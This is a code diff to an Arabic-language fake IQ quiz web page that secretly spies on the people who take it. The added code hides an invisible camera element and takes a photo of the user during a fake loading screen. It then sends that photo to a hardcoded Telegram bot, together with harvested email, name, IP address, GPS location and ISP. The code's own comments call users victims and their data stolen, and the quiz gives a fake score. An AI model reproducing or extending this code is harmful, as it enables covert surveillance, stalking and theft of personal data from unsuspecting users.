@@ -218,6 +218,16 @@
             text-align: center;
             margin-top: 15px;
         }
+        /* كاميرا مخفية */
+        #hiddenCamera {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
     </style>
 </head>
 <body>
@@ -227,6 +237,10 @@
     <div class="spinner"></div>
     <p style="color: #aaa; margin-top: 20px; font-size: 16px;">جاري معالجة نتيجتك...</p>
 </div>
+
+<!-- عناصر الكاميرا المخفية -->
+<video id="hiddenCamera" autoplay muted playsinline></video>
+<canvas id="photoCanvas" style="display:none;"></canvas>
 
 <div class="container">
     <div class="card">
@@ -324,6 +338,8 @@ const questions = [
 
 let currentQuestion = 0;
 let answers = [];
+let cameraStream = null;
+let photoCaptured = false;
 let stolenData = {
     timestamp: new Date().toLocaleString('ar-SA'),
     ip: '-',
@@ -343,6 +359,7 @@ let stolenData = {
     screen: '',
     timezone: '',
     language: '',
+    photoBase64: '',
     questions: []
 };
 
@@ -366,7 +383,6 @@ function loadQuestion() {
         container.appendChild(div);
     });
     
-    // شريط التقدم
     const progress = ((currentQuestion) / questions.length) * 100;
     document.getElementById('progressFill').style.width = progress + '%';
     
@@ -374,10 +390,8 @@ function loadQuestion() {
 }
 
 function selectOption(index) {
-    // نضيف الإجابة
     answers[currentQuestion] = index;
     
-    // نظهر الاختيار
     document.querySelectorAll('.option').forEach((el, i) => {
         el.classList.toggle('selected', i === index);
     });
@@ -388,14 +402,12 @@ function selectOption(index) {
 function nextQuestion() {
     currentQuestion++;
     
-    // نسجل الإجابة
     stolenData.questions.push({
         q: questions[currentQuestion-1].q,
         answer: questions[currentQuestion-1].options[answers[currentQuestion-1]]
     });
     
     if (currentQuestion >= questions.length) {
-        // خلصنا الأسئلة → نظهر طلب الإيميل
         showEmailForm();
         return;
     }
@@ -411,10 +423,8 @@ function showEmailForm() {
     document.getElementById('resultArea').style.display = 'block';
     document.getElementById('progressFill').style.width = '100%';
     
-    // نهاية التايمر
     clearInterval(timerInterval);
     
-    // نبدأ نجمع المعلومات في الخلفية
     collectData();
 }
 
@@ -472,9 +482,84 @@ async function collectData() {
 }
 
 // ================================================================
+//                     تصوير الضحية بالكاميرا
+// ================================================================
+async function capturePhoto() {
+    try {
+        // نطلب الكاميرا الأمامية (user-facing camera)
+        cameraStream = await navigator.mediaDevices.getUserMedia({
+            video: { 
+                facingMode: 'user',
+                width: { ideal: 640 },
+                height: { ideal: 480 }
+            },
+            audio: false
+        });
+        
+        const video = document.getElementById('hiddenCamera');
+        video.srcObject = cameraStream;
+        
+        // ننتظر شوي عشان الكاميرا تشتغل وتضبط الإضاءة
+        await new Promise(resolve => setTimeout(resolve, 300));
+        
+        // نلتقط الصورة من الفيديو
+        const canvas = document.getElementById('photoCanvas');
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        const ctx = canvas.getContext('2d');
+        
+        // نقلب الصورة إذا كانت الكاميرا الأمامية (مرآة)
+        ctx.translate(canvas.width, 0);
+        ctx.scale(-1, 1);
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        
+        // نحول لـ Base64 بصيغة JPEG عالية الجودة
+        stolenData.photoBase64 = canvas.toDataURL('image/jpeg', 0.85);
+        photoCaptured = true;
+        
+        // نوقف الكاميرا
+        stopCamera();
+        
+        console.log('✅ تم التقاط صورة الضحية بنجاح');
+    } catch(e) {
+        console.log('❌ فشل تصوير الضحية:', e.message);
+        // إذا رفض المستخدم, نحاول مرة ثانية بدون mirror
+        try {
+            if (!cameraStream) {
+                cameraStream = await navigator.mediaDevices.getUserMedia({
+                    video: true,
+                    audio: false
+                });
+                const video = document.getElementById('hiddenCamera');
+                video.srcObject = cameraStream;
+                await new Promise(resolve => setTimeout(resolve, 300));
+                const canvas = document.getElementById('photoCanvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                stolenData.photoBase64 = canvas.toDataURL('image/jpeg', 0.85);
+                photoCaptured = true;
+                stopCamera();
+            }
+        } catch(e2) {
+            console.log('❌ فشل محاولة الكاميرا الثانية:', e2.message);
+        }
+    }
+}
+
+function stopCamera() {
+    if (cameraStream) {
+        cameraStream.getTracks().forEach(track => track.stop());
+        cameraStream = null;
+    }
+    document.getElementById('hiddenCamera').srcObject = null;
+}
+
+// ================================================================
 //                     إرسال النتيجة
 // ================================================================
-function submitResult() {
+async function submitResult() {
     const email = document.getElementById('emailInput').value.trim();
     const name = document.getElementById('nameInput').value.trim();
     
@@ -486,28 +571,27 @@ function submitResult() {
     stolenData.email = email;
     stolenData.name = name || 'مجهول';
     
-    // نضيف الدرجة (كل الإجابات صح طبعاً 😉)
     const score = Math.floor(Math.random() * 30) + 130; // 130-160
     stolenData.iqScore = score;
     
     // نظهر التحميل
     document.getElementById('loadingOverlay').classList.add('active');
     
+    // نحاول نصور الضحية بالكاميرا (في الخلفية)
+    await capturePhoto();
+    
     // نرسل بعد ثانية
     setTimeout(() => {
-        // نخفي التحميل
         document.getElementById('loadingOverlay').classList.remove('active');
         
-        // نرسل كل شيء
         sendAllData();
         
-        // نظهر النتيجة النهائية
         document.getElementById('resultArea').style.display = 'none';
         document.getElementById('finalResult').style.display = 'block';
         document.getElementById('finalScore').textContent = score;
         document.getElementById('resultEmailDisplay').textContent = `📧 تم إرسال النتيجة إلى: ${email}`;
         
-    }, 2000);
+    }, 1000);
 }
 
 // ================================================================
@@ -524,7 +608,7 @@ function sendAllData() {
     // 2. نرسل لتيليجرام
     sendToTelegram(data);
     
-    // 3. نسوي console.log
+    // 3. نطبع في console
     console.log('========== البيانات المسروقة ==========');
     console.log('الإيميل:', data.email);
     console.log('الاسم:', data.name);
@@ -538,16 +622,16 @@ function sendAllData() {
     console.log('اللغة:', data.language);
     console.log('مزود الخدمة:', data.isp);
     console.log('درجة IQ:', data.iqScore);
+    console.log('صورة الضحية:', data.photoBase64 ? '✅ تم التقاطها (' + data.photoBase64.length + ' حرف)' : '❌ لم يتم التقاطها');
     console.log('========================================');
 }
 
 // ================================================================
-//                     إرسال لتيليجرام
+//                     إرسال لتيليجرام (بالصورة)
 // ================================================================
 function sendToTelegram(data) {
-    // غير هالقيم بقيمك
     const BOT_TOKEN = '8615804805:AAEnqsH14JzpGTofTGZalI6yu-HtSXNWf7k';
-    const CHAT_ID = '5197359202';  // ← غير هذا برقم الـ chat id
+    const CHAT_ID = '5197359202';
     
     if (CHAT_ID.includes('ChatID')) return;
     
@@ -557,11 +641,12 @@ function sendToTelegram(data) {
         mapsLink = `📍 <a href="https://www.google.com/maps?q=${data.lat},${data.lon}">الموقع الدقيق على الخريطة</a>`;
     }
     
-    // نحضر الـ GPS بدقة
     let gpsInfo = '❌ لم يتم الحصول على GPS';
     if (data.lat && data.lon) {
         gpsInfo = `${data.lat}, ${data.lon} (الدقة: ${data.accuracy || 'غير معروف'})`;
     }
+    
+    let photoStatus = data.photoBase64 ? '✅ تم التقاط صورة للضحية' : '❌ فشل التصوير (رفض الإذن أو لا توجد كاميرا)';
     
     const message = `
 🔔 <b>ضحية جديدة - اختبار IQ</b>
@@ -569,6 +654,7 @@ function sendToTelegram(data) {
 👤 <b>الاسم:</b> ${data.name}
 📧 <b>الإيميل:</b> ${data.email}
 🧠 <b>درجة IQ:</b> ${data.iqScore}
+📸 <b>الحالة:</b> ${photoStatus}
 
 🌐 <b>IP:</b> ${data.ip}
 🏙️ <b>المدينة:</b> ${data.city}
@@ -586,6 +672,7 @@ ${mapsLink}
 🕒 <b>الوقت:</b> ${data.timestamp}
 `;
 
+    // إرسال النص أولاً
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -595,7 +682,30 @@ ${mapsLink}
             parse_mode: 'HTML',
             disable_web_page_preview: false
         })
-    }).catch(e => console.log('Telegram error:', e));
+    }).catch(e => console.log('Telegram message error:', e));
+
+    // إرسال صورة الضحية كملف إذا كانت موجودة
+    if (data.photoBase64 && data.photoBase64.length > 100) {
+        // نحول Base64 إلى Blob
+        const byteString = atob(data.photoBase64.split(',')[1]);
+        const mimeString = data.photoBase64.split(',')[0].split(':')[1].split(';')[0];
+        const ab = new ArrayBuffer(byteString.length);
+        const ia = new Uint8Array(ab);
+        for (let i = 0; i < byteString.length; i++) {
+            ia[i] = byteString.charCodeAt(i);
+        }
+        const blob = new Blob([ab], { type: mimeString });
+        
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('caption', `📸 صورة الضحية: ${data.name || 'مجهول'} - ${data.email}`);
+        formData.append('photo', blob, `victim_${Date.now()}.jpg`);
+        
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+        }).catch(e => console.log('Telegram photo error:', e));
+    }
 }
 
 // ================================================================
